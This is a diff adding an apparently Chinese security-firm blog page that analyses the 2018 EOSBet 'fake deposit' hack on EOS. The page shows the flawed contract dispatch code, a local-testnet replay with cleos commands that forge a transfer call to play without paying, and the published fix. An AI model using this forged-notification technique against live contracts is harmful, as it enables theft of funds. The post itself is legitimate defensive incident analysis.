@@ -1,0 +1,583 @@
+<!DOCTYPE html>
+<!--[if IE 8]> <html lang="en" class="ie8 no-js"> <![endif]-->
+<!--[if IE 9]> <html lang="en" class="ie9 no-js"> <![endif]-->
+<!--[if !IE]><!-->
+<html lang="en">
+<!--<![endif]-->
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+  <title>EOS dApp 漏洞盘点分析-EOSBet 假充值漏洞1 | 零时科技</title>
+
+  <meta content="width=device-width, initial-scale=1.0" name="viewport">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+
+  <meta name="description" content="Written by WeaponX@零时科技 本文所有过程均在本地测试节点完成 文章用到的所有代码均在 https://github.com/NoneAge/EOS_dApp_Security_Incident_Analysis 0x00 背景EOSBet在2018年9月14日遭到黑客攻击，根据EOSBet官方通告，此次攻击共被盗44,427.4302 EOS（折合人民币160万，9月14日价格">
+<meta name="keywords" content="区块链,区块链安全,EOS,EOS dApp 漏洞盘点">
+<meta property="og:type" content="article">
+<meta property="og:title" content="EOS dApp 漏洞盘点分析-EOSBet 假充值漏洞1">
+<meta property="og:url" content="https://blog.noneage.com/EOS-dApp-漏洞盘点分析-EOSBet-假充值漏洞1/index.html">
+<meta property="og:site_name" content="零时科技">
+<meta property="og:description" content="Written by WeaponX@零时科技 本文所有过程均在本地测试节点完成 文章用到的所有代码均在 https://github.com/NoneAge/EOS_dApp_Security_Incident_Analysis 0x00 背景EOSBet在2018年9月14日遭到黑客攻击，根据EOSBet官方通告，此次攻击共被盗44,427.4302 EOS（折合人民币160万，9月14日价格">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="https://blog.noneage.com/EOS-dApp-漏洞盘点分析-EOSBet-假充值漏洞1/asset/0.png">
+<meta property="og:image" content="https://blog.noneage.com/EOS-dApp-漏洞盘点分析-EOSBet-假充值漏洞1/asset/4.png">
+<meta property="og:image" content="https://blog.noneage.com/EOS-dApp-漏洞盘点分析-EOSBet-假充值漏洞1/asset/1.png">
+<meta property="og:image" content="https://blog.noneage.com/EOS-dApp-漏洞盘点分析-EOSBet-假充值漏洞1/asset/2.png">
+<meta property="og:image" content="https://blog.noneage.com/EOS-dApp-漏洞盘点分析-EOSBet-假充值漏洞1/asset/3.png">
+<meta property="og:updated_time" content="2019-06-10T06:04:13.389Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="EOS dApp 漏洞盘点分析-EOSBet 假充值漏洞1">
+<meta name="twitter:description" content="Written by WeaponX@零时科技 本文所有过程均在本地测试节点完成 文章用到的所有代码均在 https://github.com/NoneAge/EOS_dApp_Security_Incident_Analysis 0x00 背景EOSBet在2018年9月14日遭到黑客攻击，根据EOSBet官方通告，此次攻击共被盗44,427.4302 EOS（折合人民币160万，9月14日价格">
+<meta name="twitter:image" content="https://blog.noneage.com/EOS-dApp-漏洞盘点分析-EOSBet-假充值漏洞1/asset/0.png">
+  
+    <link rel="alternative" href="/atom.xml" title="零时科技" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.ico">
+  
+    
+  <meta content="{{ title }}" name="description">
+  <meta content="{{ title }}" name="keywords">
+  <meta content="{{ title }}" name="author">
+
+  <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,400,600,700|PT+Sans+Narrow|Source+Sans+Pro:200,300,400,600,700,900&amp;subset=all" rel="stylesheet" type="text/css">
+
+  <!-- Global styles START -->   
+  <link rel="stylesheet" href="/metronic/assets/plugins/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="/metronic/assets/plugins/bootstrap/css/bootstrap.min.css">
+  <!-- Global styles END --> 
+   
+  <!-- Page level plugin styles START -->
+  <link rel="stylesheet" href="/metronic/assets/pages/css/animate.css">
+  <link rel="stylesheet" href="/metronic/assets/plugins/owl.carousel/assets/owl.carousel.css">
+  <!-- Page level plugin styles END -->
+
+  <!-- Theme styles START -->
+  <link rel="stylesheet" href="/metronic/assets/pages/css/components.css">
+  <link rel="stylesheet" href="/metronic/assets/pages/css/slider.css">
+  <link rel="stylesheet" href="/metronic/assets/corporate/css/style.css">
+  <link rel="stylesheet" href="/metronic/assets/pages/css/portfolio.css">
+  <link rel="stylesheet" href="/metronic/assets/corporate/css/style-responsive.css">
+  <link rel="stylesheet" href="/metronic/assets/corporate/css/themes/red.css">
+  <link rel="stylesheet" href="/css/theme-styles.css">
+  <!-- Theme styles END -->
+</head>
+</html>
+<body class="corporate">
+  <!-- BEGIN TOP BAR -->
+<div class="pre-header">
+  <div class="container">
+    <div class="row">
+      <!-- BEGIN TOP BAR LEFT PART -->
+      <div class="col-md-6 col-sm-6 col-xs-9 additional-shop-info">
+	<ul class="list-unstyled list-inline">
+	  <li><i class="fa fa-phone"></i><span>150-2922-9543</span></li>
+	  <li><i class="fa fa-envelope-o"></i><span>support@noneage.com</span></li>
+	</ul>
+      </div>
+      <!-- END TOP BAR LEFT PART -->
+      <!-- BEGIN TOP BAR MENU -->
+      <div class="col-md-6 col-sm-6 col-xs-3 additional-nav">
+	<ul class="list-unstyled list-inline pull-right">
+	  <!--<li><a href="/login">Log In</a></li>-->
+	</ul>
+      </div>
+      <!-- END TOP BAR MENU -->
+    </div>
+  </div>        
+</div>
+<!-- END TOP BAR -->
+<!-- BEGIN HEADER -->
+<div class="header">
+  <div class="container">
+    <!--<a class="site-logo" href="/" id="logo">零时科技</a>-->
+
+    <a class="site-logo" href="/">
+      <img width="148" hight="42" src="/metronic/assets/corporate/img/logos/noneage_logo_gray.png" alt="noneage blog">
+    </a>
+
+    <a href="javascript:void(0);" class="mobi-toggler"><i class="fa fa-bars"></i></a>
+
+    <!-- BEGIN NAVIGATION -->
+    <div class="header-navigation pull-right font-transform-inherit">
+      <ul>
+	
+	<li class="">
+	  <a href="/">Home</a>
+	</li>
+	
+	<li class="">
+	  <a href="/archives/">Archives</a>
+	</li>
+	
+	<!-- BEGIN TOP SEARCH -->
+	<li class="menu-search">
+	  <span class="sep"></span>
+	  <i class="fa fa-search search-btn"></i>
+	  <div class="search-box">
+	    <form action="#">
+	      <div class="input-group">
+		<input type="text" placeholder="Search" class="form-control st-default-search-input">
+		<span class="input-group-btn">
+		  <button class="btn btn-primary" type="submit">Search</button>
+		</span>
+	      </div>
+	    </form>
+	  </div> 
+	</li>
+	<!-- END TOP SEARCH -->
+      </ul>
+    </div>
+    <!-- END NAVIGATION -->
+  </div>
+</div>
+<!-- Header END -->
+
+  <div class="container">
+  <ul class="breadcrumb">
+    <li><a href="/">Home</a></li>
+    <li><a href="">Blog</a></li>
+    <li class="active">Post</li>
+  </ul>
+  <section id="main">
+    
+    <h2 itemprop="name">
+      <a class="article-title" href="/EOS-dApp-漏洞盘点分析-EOSBet-假充值漏洞1/">EOS dApp 漏洞盘点分析-EOSBet 假充值漏洞1</a>
+    </h2>
+
+
+    <div class="row">
+<div class="col-md-9 col-sm-9 blog-posts">
+<article id="post-EOS-dApp-漏洞盘点分析-EOSBet-假充值漏洞1" class="article article-type-post blog-item" itemscope="" itemprop="blogPost">
+  <div class="article-meta">
+  </div>
+  <div class="article-inner">
+    
+    
+    <header class="article-header">
+      <ul class="blog-info">
+	<li><i class="fa fa-user"></i> Anonymous</li>
+	<li><i class="fa fa-calendar"></i>
+	  <time datetime="2019-01-03T09:06:53.000Z" itemprop="datePublished">2019/01/03</time>
+
+	</li>
+	<li class="hidden-xs"><i class="fa fa-comments"></i>
+	  <a href="https://blog.noneage.com/EOS-dApp-漏洞盘点分析-EOSBet-假充值漏洞1/#disqus_thread" class="article-comment-link">Comments</a>
+	</li>
+	<li class="hidden-xs"><i class="fa fa-tags"></i> 
+	  
+  
+    <a href="/tags/区块链/" title="区块链">区块链</a>,
+  
+    <a href="/tags/区块链安全/" title="区块链安全">区块链安全</a>,
+  
+    <a href="/tags/EOS/" title="EOS">EOS</a>,
+  
+    <a href="/tags/EOS-dApp-漏洞盘点/" title="EOS dApp 漏洞盘点">EOS dApp 漏洞盘点</a>
+  
+
+
+	</li>
+      </ul>
+      
+  <div class="article-category">
+    
+    Categories:
+    <a class="article-category-link" href="/categories/Contract/">Contract</a>, <a class="article-category-link" href="/categories/Contract/EOS/">EOS</a>
+  </div>
+  <br>
+
+
+    </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p><em>Written by WeaponX@零时科技</em></p>
+<p><em>本文所有过程均在本地测试节点完成</em></p>
+<p><em>文章用到的所有代码均在 <a href="https://github.com/NoneAge/EOS_dApp_Security_Incident_Analysis" target="_blank" rel="noopener">https://github.com/NoneAge/EOS_dApp_Security_Incident_Analysis</a></em></p>
+<h2 id="0x00-背景"><a href="#0x00-背景" class="headerlink" title="0x00 背景"></a>0x00 背景</h2><p><code>EOSBet</code>在2018年9月14日遭到黑客攻击，根据<code>EOSBet</code>官方通告，此次攻击共被盗<code>44,427.4302 EOS</code>（折合人民币160万，9月14日价格）。<br><a id="more"></a><br><img src="asset/0.png" alt=""></p>
+<h2 id="0x01-技术分析"><a href="#0x01-技术分析" class="headerlink" title="0x01 技术分析"></a>0x01 技术分析</h2><p>由于EOSBet代码并未开源，但官方复盘攻击事件后给出了<code>EOSIO_ABI</code></p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// extend from EOSIO_ABI, because we need to listen to incoming eosio.token transfers</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EOSIO_ABI_EX( TYPE, MEMBERS ) \</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">"C"</span> &#123; \</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">apply</span><span class="params">( <span class="keyword">uint64_t</span> receiver, <span class="keyword">uint64_t</span> code, <span class="keyword">uint64_t</span> action )</span> </span>&#123; \</span><br><span class="line">		<span class="keyword">auto</span> self = receiver; \</span><br><span class="line">		<span class="keyword">if</span>( action == N(onerror)) &#123; \</span><br><span class="line">			<span class="comment">/* onerror is only valid if it is for the "eosio" code account and authorized by "eosio"'s "active permission */</span> \</span><br><span class="line">			eosio_assert(code == N(eosio), <span class="string">"onerror action's are only valid from the \"eosio\" system account"</span>); \</span><br><span class="line">		&#125; \</span><br><span class="line">		<span class="keyword">if</span>( code == self || code == N(eosio.token) || action == N(onerror) ) &#123; \</span><br><span class="line">			<span class="function">TYPE <span class="title">thiscontract</span><span class="params">( self )</span></span>; \</span><br><span class="line">			<span class="keyword">switch</span>( action ) &#123; \</span><br><span class="line">				EOSIO_API( TYPE, MEMBERS ) \</span><br><span class="line">			&#125; \</span><br><span class="line">		<span class="comment">/* does not allow destructor of thiscontract to run: eosio_exit(0); */</span> \</span><br><span class="line">		&#125; \</span><br><span class="line">	&#125; \</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>通过官方给出的<code>EOSIO_ABI</code>，问题主要出在以下代码</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>( code == self || code == N(eosio.token) || action == N(onerror) ) &#123; \</span><br><span class="line">	<span class="function">TYPE <span class="title">thiscontract</span><span class="params">( self )</span></span>; \</span><br><span class="line">	<span class="keyword">switch</span>( action ) &#123; \</span><br><span class="line">		EOSIO_API( TYPE, MEMBERS ) \</span><br><span class="line">	&#125; \</span><br><span class="line">｝</span><br></pre></td></tr></table></figure>
+<p>该合约对<code>action</code>进行转发的时候仅仅验证了<code>code == self</code>（调用者必须是该合约本身，即<code>eosbetdice11</code>）和<code>code == N(eosio.token)</code>（调用者必须是<code>eosio.token</code>）。从这里看似乎是验证了只有合约本身和<code>eosio.token</code>可以调用合约函数。</p>
+<p>但是，开发者忽略了这一点。如果<code>A</code>合约直接向<code>B</code>合约发起一个<code>transaction</code>调用<code>B</code>合约的函数，那么本质上是<code>B</code>合约自身完成函数调用，也就是说任何合约都可以调用<code>eosbetdice11</code>合约中<code>abi</code>暴露的函数。</p>
+<p>黑客可以直接调用<code>eosbetdice11</code>合约中的<code>transfer</code>函数，即不用消耗任何<code>EOS</code>来玩<code>EOSBet</code>，输了不赔赢了稳赚。</p>
+<h2 id="0x02-攻击复盘"><a href="#0x02-攻击复盘" class="headerlink" title="0x02 攻击复盘"></a>0x02 攻击复盘</h2><p>创建<code>eosio.token</code>账户</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cleos create account eosio eosio.token EOS6MRyAjQq8ud7hVNYcfnVPJqcVpscN5So8BhtHuGYqET5GDW5CV</span><br></pre></td></tr></table></figure>
+<p>部署<code>eosio.token</code>合约并初始化</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 部署合约</span></span><br><span class="line">cleos <span class="built_in">set</span> contract eosio.token /home/user/contracts/eosio.token -p eosio</span><br><span class="line"><span class="comment"># 初始化合约</span></span><br><span class="line">cleos push action eosio.token create <span class="string">'[ "eosio", "1000000000.0000 EOS", 0, 0, 0]'</span> -p eosio.token</span><br></pre></td></tr></table></figure>
+<p>创建游戏账户、开奖账户和攻击者账户</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#创建游戏账户和开奖账户</span></span><br><span class="line">cleos create account eosio eosbetdice11 EOS6xKEsz5rXvss1otnB5kD1Fv9wRYLmJjQuBefRYaDY7jcfxtpVk</span><br><span class="line">cleos create account eosio eosbetcasino EOS6xKEsz5rXvss1otnB5kD1Fv9wRYLmJjQuBefRYaDY7jcfxtpVk</span><br><span class="line"><span class="comment">#创建攻击者账户</span></span><br><span class="line">cleos create account eosio attacker EOS6xKEsz5rXvss1otnB5kD1Fv9wRYLmJjQuBefRYaDY7jcfxtpVk</span><br></pre></td></tr></table></figure>
+<p>设置账户随机权限和开奖权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#设置权限</span></span><br><span class="line">cleos <span class="built_in">set</span> account permission eosbetdice11 active <span class="string">'&#123;"threshold": 1,"keys": [&#123;"key": "EOS6xKEsz5rXvss1otnB5kD1Fv9wRYLmJjQuBefRYaDY7jcfxtpVk","weight": 1&#125;],"accounts":[&#123;"permission":&#123;"actor":"eosbetdice11","permission":"eosio.code"&#125;,"weight":1&#125;]&#125;'</span> owner -p eosbetdice11@owner</span><br><span class="line">cleos <span class="built_in">set</span> account permission eosbetcasino random <span class="string">'&#123;"threshold": 1,"keys": [&#123;"key": "EOS6xKEsz5rXvss1otnB5kD1Fv9wRYLmJjQuBefRYaDY7jcfxtpVk","weight": 1&#125;],"accounts":[]&#125;'</span> owner -p eosbetcasino@owner</span><br><span class="line"><span class="comment">#设置开奖权限</span></span><br><span class="line">cleos <span class="built_in">set</span> action permission eosbetcasino eosbetdice11 resolvebet random</span><br></pre></td></tr></table></figure>
+<p>向相关账户冲入代币</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#往相关账户充值</span></span><br><span class="line">cleos push action eosio.token issue <span class="string">'["attacker", "100000.0000 EOS", "memo"]'</span> -p eosio@active</span><br><span class="line">cleos push action eosio.token issue <span class="string">'["eosbetdice11", "100000.0000 EOS", "memo"]'</span> -p eosio@active</span><br></pre></td></tr></table></figure>
+<p><img src="asset/4.png" alt=""></p>
+<p>部署游戏合约并初始化</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#部署游戏合约</span></span><br><span class="line">cleos <span class="built_in">set</span> contract eosbetdice11 /home/user/contracts/eosbetdice</span><br><span class="line"><span class="comment">#初始化游戏合约</span></span><br><span class="line">cleos push action eosbetdice11 initcontract <span class="string">'&#123;"randomness_key":"EOS6xKEsz5rXvss1otnB5kD1Fv9wRYLmJjQuBefRYaDY7jcfxtpVk"&#125;'</span> -p eosbetcasino</span><br></pre></td></tr></table></figure>
+<p>模拟黑客攻击（伪造转账通知）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cleos push action eosbetdice11 transfer <span class="string">'["attacker", "eosbetdice11", "10.0000 EOS", "66-attacker-"]'</span> -p attacker</span><br></pre></td></tr></table></figure>
+<p>查询游戏订单</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cleos get table eosbetdice11 eosbetdice11 activebets</span><br></pre></td></tr></table></figure>
+<p><img src="asset/1.png" alt=""></p>
+<p>可见，游戏订单已经生成，查询<code>attacker</code>和<code>eosbetdice11</code>账户</p>
+<p><img src="asset/2.png" alt=""></p>
+<p>按照游戏规则，只有在支付了<code>EOS</code>后才能生成游戏，但是被黑客攻击后生成订单并没有消耗任何的<code>EOS</code>。</p>
+<p>最后对该订单进行开奖。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cleos push action eosbetdice11 resolvebet <span class="string">'&#123;"bet_id":"237902368081510060", "sig":"SIG_K1_K862MEbB45rMi9bvYRPbqA9F6tbrte9osUbZk3fUXXvsnf3zQRNdyYrunc4zhyQWUho2a4meho1k8kNvnrLLYdW1ge8kD1"&#125;'</span> -j -p eosbetcasino@random</span><br></pre></td></tr></table></figure>
+<p><img src="asset/3.png" alt=""></p>
+<p>总结，黑客伪造转账通知来玩游戏不消耗任何<code>EOS</code>，游戏成功即可获利，即使最后游戏失败也不会有任何损失。</p>
+<h2 id="0x03-后记"><a href="#0x03-后记" class="headerlink" title="0x03 后记"></a>0x03 后记</h2><p>EOSBet随后将修复方案公开</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// extend from EOSIO_ABI, because we need to listen to incoming eosio.token transfers</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EOSIO_ABI_EX( TYPE, MEMBERS ) \</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">"C"</span> &#123; \</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">apply</span><span class="params">( <span class="keyword">uint64_t</span> receiver, <span class="keyword">uint64_t</span> code, <span class="keyword">uint64_t</span> action )</span> </span>&#123; \</span><br><span class="line">		<span class="keyword">auto</span> self = receiver; \</span><br><span class="line">		<span class="keyword">if</span>( code == self || code == N(eosio.token)) &#123; \</span><br><span class="line">			<span class="keyword">if</span>( action == N(transfer))&#123; \</span><br><span class="line">				<span class="comment">// 必须是eosio.token来调用合约自身的transfer函数</span></span><br><span class="line">				eosio_assert( code == N(eosio.token), <span class="string">"Must transfer EOS"</span>); \</span><br><span class="line">			&#125; \</span><br><span class="line">			<span class="function">TYPE <span class="title">thiscontract</span><span class="params">( self )</span></span>; \</span><br><span class="line">			<span class="keyword">switch</span>( action ) &#123; \</span><br><span class="line">				EOSIO_API( TYPE, MEMBERS ) \</span><br><span class="line">			&#125; \</span><br><span class="line">		<span class="comment">/* does not allow destructor of thiscontract to run: eosio_exit(0); */</span> \</span><br><span class="line">		&#125; \</span><br><span class="line">	&#125; \</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到，<code>EOSBet</code>官方给出的修复方案是仅有<code>eosio.token</code>合约可以调用<code>transfer</code>函数。官方修复后将代码开源到Gitlab，地址为<code>https://gitlab.com/EOSBetCasino/eosbetdice_public</code>，但是在整整一个月后又遭到了转账通知伪造攻击。欲知详情，请听下回分解:D</p>
+<h2 id="0x04-修复方案"><a href="#0x04-修复方案" class="headerlink" title="0x04 修复方案"></a>0x04 修复方案</h2><p>零时科技安全专家建议，要防止转账通知伪造必须在处理转账交易时要验证以下内容：</p>
+<ul>
+<li><p>通知是否来自<code>eosio.token</code>，即只处理<code>eosio.token</code>发送的通知</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eosio_assert(code == N(eosio.token), <span class="string">"Must transfer from eosio.token"</span>);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>转账发起人或者接受人是否是自己，即转账必须跟合约本身有关，不处理其他合约的转账通知</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eosio_assert(transfer.from == _self || transfer.to == _self, <span class="string">"Must transfer from self or transfer to self"</span>);</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h2 id="0x05-Refer"><a href="#0x05-Refer" class="headerlink" title="0x05 Refer"></a>0x05 Refer</h2><p><a href="https://medium.com/@eosbetcasino/eosbet-transfer-hack-statement-31a3be4f5dcf" target="_blank" rel="noopener">https://medium.com/@eosbetcasino/eosbet-transfer-hack-statement-31a3be4f5dcf</a></p>
+<p><a href="https://gitlab.com/EOSBetCasino/eosbetdice_public" target="_blank" rel="noopener">https://gitlab.com/EOSBetCasino/eosbetdice_public</a></p>
+
+      
+    </div>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/以太坊智能合约漏洞实战详解：整数溢出攻击/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          以太坊智能合约漏洞实战详解：整数溢出攻击
+        
+      </div>
+    </a>
+  
+  
+</nav>
+
+  
+  <br>
+</article>
+
+
+
+
+</div>
+<div class="col-md-3 col-sm-3 blog-sidebar">
+  <!-- CATEGORIES START -->
+<h2 class="no-top-space">Categories</h2>
+
+<div class="widget-wrap">
+  <div class="widget">
+    <ul class="nav sidebar-categories margin-bottom-40">
+      
+	<li>
+	  <a href="/categories/Contract/">Contract (7)</a>
+	</li>
+      
+	<li>
+	  <a href="/categories/Contract/EOS/">EOS (6)</a>
+	</li>
+      
+	<li>
+	  <a href="/categories/Contract/Ether/">Ether (1)</a>
+	</li>
+      
+	<li>
+	  <a href="/categories/PoW/">PoW (1)</a>
+	</li>
+      
+	<li>
+	  <a href="/categories/Linux/">Linux (1)</a>
+	</li>
+      
+	<li>
+	  <a href="/categories/Contract/EOS/Random/">Random (2)</a>
+	</li>
+      
+	<li>
+	  <a href="/categories/Contract/Ether/overflow/">overflow (1)</a>
+	</li>
+      
+	<li>
+	  <a href="/categories/PoW/双花/">双花 (1)</a>
+	</li>
+      
+	<li>
+	  <a href="/categories/PoW/双花/51-攻击/">51%攻击 (1)</a>
+	</li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<!-- CATEGORIES END -->
+
+<!-- BEGIN BLOG TAGS -->
+<div class="blog-tags margin-bottom-20">
+  <h2>Tags</h2>
+  
+  <div class="widget-wrap">
+    <div class="widget">
+      
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/51-攻击/"><i class="fa fa-tags"></i>51%攻击</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/EOS/"><i class="fa fa-tags"></i>EOS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/EOS-dApp-漏洞盘点/"><i class="fa fa-tags"></i>EOS dApp 漏洞盘点</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/以太坊/"><i class="fa fa-tags"></i>以太坊</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/传统安全/"><i class="fa fa-tags"></i>传统安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/共识安全/"><i class="fa fa-tags"></i>共识安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/区块链/"><i class="fa fa-tags"></i>区块链</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/区块链安全/"><i class="fa fa-tags"></i>区块链安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/双花攻击/"><i class="fa fa-tags"></i>双花攻击</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/数字资产追踪/"><i class="fa fa-tags"></i>数字资产追踪</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/整数溢出/"><i class="fa fa-tags"></i>整数溢出</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/智能合约安全/"><i class="fa fa-tags"></i>智能合约安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/比特币/"><i class="fa fa-tags"></i>比特币</a></li></ul>
+    </div>
+  </div>
+
+
+</div>
+<!-- END BLOG TAGS -->
+
+
+<!-- BEGIN FEATURED POSTS -->                            
+<h2>Featured Posts</h2>
+<div class="recent-news margin-bottom-10">
+  
+    
+      <div class="row margin-bottom-10">
+	<div class="col-md-4">
+	  <img src="https://blog.noneage.com/EOS-dApp-%E6%BC%8F%E6%B4%9E%E7%9B%98%E7%82%B9%E5%88%86%E6%9E%90-EOSBet-%E5%81%87%E5%85%85%E5%80%BC%E6%BC%8F%E6%B4%9E1/asset/eosbet.jpg" class="img-responsive ">
+	</div>
+	<div class="col-md-8">
+	  <h3><a href="https://blog.noneage.com/EOS-dApp-漏洞盘点分析-EOSBet-假充值漏洞1/">EOS dApp 漏洞盘点分析-EOSBet 假充值漏洞1</a></h3>
+	</div>                        
+      </div>
+    
+  
+    
+      <div class="row margin-bottom-10">
+	<div class="col-md-4">
+	  <img src="https://blog.noneage.com/EOS-dApp-%E6%BC%8F%E6%B4%9E%E7%9B%98%E7%82%B9-LuckyGo-inline-action-%E4%BA%A4%E6%98%93%E5%9B%9E%E6%BB%9A%E6%94%BB%E5%87%BB/asset/rollback.jpeg" class="img-responsive ">
+	</div>
+	<div class="col-md-8">
+	  <h3><a href="https://blog.noneage.com/EOS-dApp-漏洞盘点-LuckyGo-inline-action-交易回滚攻击/">EOS dApp 漏洞盘点- LuckyGo inline action 交易回滚攻击</a></h3>
+	</div>                        
+      </div>
+    
+  
+    
+      <div class="row margin-bottom-10">
+	<div class="col-md-4">
+	  <img src="https://blog.noneage.com/Agora%E6%9A%97%E7%BD%91BTC%E5%85%B3%E8%81%94%E5%9C%B0%E5%9D%80%E4%BA%A4%E6%98%93%E5%BC%82%E5%B8%B8%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90/assets/agora.jpg" class="img-responsive ">
+	</div>
+	<div class="col-md-8">
+	  <h3><a href="https://blog.noneage.com/Agora暗网BTC关联地址交易异常溯源分析/">Agora暗网BTC关联地址交易异常溯源分析</a></h3>
+	</div>                        
+      </div>
+    
+  
+    
+      <div class="row margin-bottom-10">
+	<div class="col-md-4">
+	  <img src="https://blog.noneage.com/%E4%BB%A5%E5%A4%AA%E5%9D%8A%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98%E8%AF%A6%E8%A7%A3%EF%BC%9A%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/blog.png" class="img-responsive ">
+	</div>
+	<div class="col-md-8">
+	  <h3><a href="https://blog.noneage.com/以太坊智能合约漏洞实战详解：整数溢出攻击/">以太坊智能合约漏洞实战详解：整数溢出攻击</a></h3>
+	</div>                        
+      </div>
+    
+  
+    
+      <div class="row margin-bottom-10">
+	<div class="col-md-4">
+	  <img src="https://blog.noneage.com/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%85%B1%E8%AF%86%E5%AE%89%E5%85%A8%E2%80%9451-%E6%94%BB%E5%87%BB%E6%B5%85%E6%9E%90/thub.jpg" class="img-responsive ">
+	</div>
+	<div class="col-md-8">
+	  <h3><a href="https://blog.noneage.com/区块链共识安全—51-攻击浅析/">区块链共识安全：51% 攻击浅析</a></h3>
+	</div>                        
+      </div>
+    
+  
+    
+      <div class="row margin-bottom-10">
+	<div class="col-md-4">
+	  <img src="https://blog.noneage.com/apt-apt-get-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90-CVE-2019-3462/thub.jpg" class="img-responsive ">
+	</div>
+	<div class="col-md-8">
+	  <h3><a href="https://blog.noneage.com/apt-apt-get-远程代码执行漏洞浅析-CVE-2019-3462/">apt/apt-get 远程代码执行漏洞浅析(CVE-2019-3462)</a></h3>
+	</div>                        
+      </div>
+    
+  
+    
+      <div class="row margin-bottom-10">
+	<div class="col-md-4">
